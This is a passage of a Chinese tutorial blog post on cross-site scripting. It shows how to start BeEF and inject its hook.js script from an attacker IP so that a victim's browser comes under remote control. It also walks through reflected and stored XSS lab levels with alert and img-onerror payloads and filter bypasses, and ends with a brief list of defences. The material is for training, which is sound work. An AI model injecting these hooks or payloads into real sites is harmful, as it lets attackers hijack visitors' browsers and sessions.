+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>启动beef</span><br><span class="line">beef-xss</span><br><span class="line"><span class="meta">#</span>启动成功后生成xss钩子</span><br><span class="line">[*]    Hook: &lt;script src="http://&lt;IP&gt;:3000/hook.js"&gt;&lt;/script&gt;</span><br><span class="line">[*] Example: &lt;script src="http://127.0.0.1:3000/hook.js"&gt;&lt;/script&gt;</span><br><span class="line"><span class="meta">#</span>web UI界面</span><br><span class="line">[*]  Web UI: http://127.0.0.1:3000/ui/panel</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>登录UI管理界面</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597405925377.png" title="1597405925377" data-fancybox="images"><img src="/img/xss/1597405925377.png" alt="1597405925377" title class></a>
+                <p>1597405925377</p>
+            </figure>
+
+<blockquote>
+<p>然后将<code>&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code>作为xss语句注入，钩子被触发，目标就会自动上线</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597406088818.png" title="1597406088818" data-fancybox="images"><img src="/img/xss/1597406088818.png" alt="1597406088818" title class></a>
+                <p>1597406088818</p>
+            </figure>
+
+<blockquote>
+<p>这里命令慢慢摸索吧</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597409122987.png" title="1597409122987" data-fancybox="images"><img src="/img/xss/1597409122987.png" alt="1597409122987" title class></a>
+                <p>1597409122987</p>
+            </figure>
+
+<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><h3 id="反射型-1"><a href="#反射型-1" class="headerlink" title="反射型"></a>反射型</h3><h4 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h4><blockquote>
+<p>XSS原则见框就插，我们发现这里不管输入说明都直接回显</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597310308297.png" title="1597310308297" data-fancybox="images"><img src="/img/xss/1597310308297.png" alt="1597310308297" title class></a>
+                <p>1597310308297</p>
+            </figure>
+
+<p><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
+<blockquote>
+<p>插入测试语句发现直接弹窗</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597310549808.png" title="1597310549808" data-fancybox="images"><img src="/img/xss/1597310549808.png" alt="1597310549808" title class></a>
+                <p>1597310549808</p>
+            </figure>
+
+<h4 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h4><blockquote>
+<p>这里我们直接输入测试语句发<code>&lt;script&gt;&lt;/script&gt;</code>被过滤了</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597310786907.png" title="1597310786907" data-fancybox="images"><img src="/img/xss/1597310786907.png" alt="1597310786907" title class></a>
+                <p>1597310786907</p>
+            </figure>
+
+<p><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+<blockquote>
+<p>这里我们直接用img标签插入成功回弹，这里可以使用大小写绕过</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597310947363.png" title="1597310947363" data-fancybox="images"><img src="/img/xss/1597310947363.png" alt="1597310947363" title class></a>
+                <p>1597310947363</p>
+            </figure>
+
+<h4 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h4><blockquote>
+<p>通过测试发现这里过滤<code>&lt;script&gt;</code>开头的语句,所以使用<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597319991473.png" title="1597319991473" data-fancybox="images"><img src="/img/xss/1597319991473.png" alt="1597319991473" title class></a>
+                <p>1597319991473</p>
+            </figure>
+
+<h3 id="存储型-1"><a href="#存储型-1" class="headerlink" title="存储型"></a>存储型</h3><h4 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h4><blockquote>
+<p>输入内容发现，会保存到数据库，每次打开都会查询并显示出来</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597320660164.png" title="1597320660164" data-fancybox="images"><img src="/img/xss/1597320660164.png" alt="1597320660164" title class></a>
+                <p>1597320660164</p>
+            </figure>
+
+<p>name：<code>test</code></p>
+<p>message：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597320803531.png" title="1597320803531" data-fancybox="images"><img src="/img/xss/1597320803531.png" alt="1597320803531" title class></a>
+                <p>1597320803531</p>
+            </figure>
+
+<h4 id="MEDIUM-1"><a href="#MEDIUM-1" class="headerlink" title="MEDIUM"></a>MEDIUM</h4><blockquote>
+<p>这里过滤了<code>&lt;script&gt;</code>标签,并且message也过滤了<code>img</code>标签，所以我尝试在name中插入，但是name有长度限制我们抓包修改一下</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597321652662.png" title="1597321652662" data-fancybox="images"><img src="/img/xss/1597321652662.png" alt="1597321652662" title class></a>
+                <p>1597321652662</p>
+            </figure>
+
+<p>name：<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+<p>message：<code>test</code></p>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597322464689.png" title="1597322464689" data-fancybox="images"><img src="/img/xss/1597322464689.png" alt="1597322464689" title class></a>
+                <p>1597322464689</p>
+            </figure>
+
+<blockquote>
+<p>抓包修改了，成功执行xss语句</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597322478517.png" title="1597322478517" data-fancybox="images"><img src="/img/xss/1597322478517.png" alt="1597322478517" title class></a>
+                <p>1597322478517</p>
+            </figure>
+
+<h4 id="HIGH-1"><a href="#HIGH-1" class="headerlink" title="HIGH"></a>HIGH</h4><blockquote>
+<p>这里我们直接用<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>尝试发现都给过滤了，然后采用<code>img</code>标签尝试，但是name依旧有长度限制，我们这次尝试在浏览器中修改长度</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597322686394.png" title="1597322686394" data-fancybox="images"><img src="/img/xss/1597322686394.png" alt="1597322686394" title class></a>
+                <p>1597322686394</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597322735493.png" title="1597322735493" data-fancybox="images"><img src="/img/xss/1597322735493.png" alt="1597322735493" title class></a>
+                <p>1597322735493</p>
+            </figure>
+
+<p>name：<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+<p>message：<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+<blockquote>
+<p>语句成功执行</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597322751829.png" title="1597322751829" data-fancybox="images"><img src="/img/xss/1597322751829.png" alt="1597322751829" title class></a>
+                <p>1597322751829</p>
+            </figure>
+
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
+<li>对用户输入输出字符进行安全过滤和转义</li>
+<li>Cookie属性HttpOnly设置为true，防止被JS调用</li>
+<li>检查HTTP Referer是否来自预料中的 URL</li>
+</ol>
+<hr>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2021-02-01T15:37:58.386Z" itemprop="dateUpdated">2021-02-01 23:37:58</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2021/02/01/XSS/" target="_blank" rel="external">http://wisejay.top/2021/02/01/XSS/</a>
+        
+    </div>
+    <footer>
+        <a href="http://wisejay.top">
+            <img src="/img/avatar.jpg" alt="Wisejay">
+            Wisejay
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2021/02/01/XSS/&title=《web安全-XSS》 — Wisejay&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2021/02/01/XSS/&title=《web安全-XSS》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2021/01/24/SQL注入/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">web安全-SQL注入</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#XSS"><span class="post-toc-number">1.</span> <span class="post-toc-text">XSS</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#常用测试语句"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">常用测试语句</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XSS分类"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">XSS分类</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#反射型"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">反射型</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#实例"><span class="post-toc-number">1.3.1.1.</span> <span class="post-toc-text">实例</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#存储型"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">存储型</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#实例-1"><span class="post-toc-number">1.3.2.1.</span> <span class="post-toc-text">实例</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#DOM型"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">DOM型</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#实例-2"><span class="post-toc-number">1.3.3.1.</span> <span class="post-toc-text">实例</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#三者区别"><span class="post-toc-number">1.3.4.</span> <span class="post-toc-text">三者区别</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XSS绕过和闭合"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">XSS绕过和闭合</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#绕过"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">绕过</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#大小写绕过"><span class="post-toc-number">1.4.1.1.</span> <span class="post-toc-text">大小写绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#双写关键字绕过"><span class="post-toc-number">1.4.1.2.</span> <span class="post-toc-text">双写关键字绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#反引号绕过"><span class="post-toc-number">1.4.1.3.</span> <span class="post-toc-text">反引号绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#编码绕过"><span class="post-toc-number">1.4.1.4.</span> <span class="post-toc-text">编码绕过</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#闭合"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">闭合</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#能闭合标签"><span class="post-toc-number">1.4.2.1.</span> <span class="post-toc-text">能闭合标签</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#不能闭合标签"><span class="post-toc-number">1.4.2.2.</span> <span class="post-toc-text">不能闭合标签</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#工具使用-Beef"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">工具使用(Beef)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场练习"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">靶场练习</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#反射型-1"><span class="post-toc-number">1.6.1.</span> <span class="post-toc-text">反射型</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#LOW"><span class="post-toc-number">1.6.1.1.</span> <span class="post-toc-text">LOW</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#MEDIUM"><span class="post-toc-number">1.6.1.2.</span> <span class="post-toc-text">MEDIUM</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#HIGH"><span class="post-toc-number">1.6.1.3.</span> <span class="post-toc-text">HIGH</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#存储型-1"><span class="post-toc-number">1.6.2.</span> <span class="post-toc-text">存储型</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#LOW-1"><span class="post-toc-number">1.6.2.1.</span> <span class="post-toc-text">LOW</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#MEDIUM-1"><span class="post-toc-number">1.6.2.2.</span> <span class="post-toc-text">MEDIUM</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#HIGH-1"><span class="post-toc-number">1.6.2.3.</span> <span class="post-toc-text">HIGH</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#防御"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">防御</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Wisejay &copy; 2019 - 2021
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2021/02/01/XSS/&title=《web安全-XSS》 — Wisejay&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2021/02/01/XSS/&title=《web安全-XSS》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABxklEQVR42u3aQW4DIQwF0Nz/0tNtpKaTbxtIVD1WVUThMQvLxjwe8biexvMv+czf8/9aYcHAxcUdc6/bkS99P+f+AIkBFxf3PHeyQfV//5oTfQJcXNyv5PbSHVxc3P/KnQS+fH1cXNzv4Sah6k1ZEs88VKvh4uIOuPkt5b6/t9zv4uLitrhXa1SPt2xfXFzcI9xq0LkPQ3m7JU+nXqyMi4t7kJsnIpMHFr1yqPASBBcXd8zN05feYfIPEUlwcXEPcnvPJqrXqdWC6sXBcHFxP8rtbZYHxPwTPOYZEy4ubpE7eVaVP+FK1szLJ1xc3N3cvFBZdQfTe5yBi4t7klu9eei1THolUzPdwcXFXcRNzpFvXC2E8gCHi4t7hju56MwLpN4u5eIHFxd3EXdV8Kr+3mvf4uLinuHuLmOSD1Gg4+LiHuHmk6pt10Inp5oS4eLibuZexZG/nJy0Y9/kYri4uJu5+ag2PHqXsNWQh4uLu4+bB69qy2R+sYKLi/tZbvWSopr6VKPpm1YrLi7u13Cr7dVJ8XOo84OLi7soZ5gEu+rKC+IuLi7ugJsXP9XAVG2ZNF+T4eLiLuVOUpN96c6C+11cXNwO9wegyt1ElvrVagAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/haruto.model.json"},"display":{"position":"right","width":212,"height":472},"mobile":{"show":true},"log":false});</script></body>
+</html>
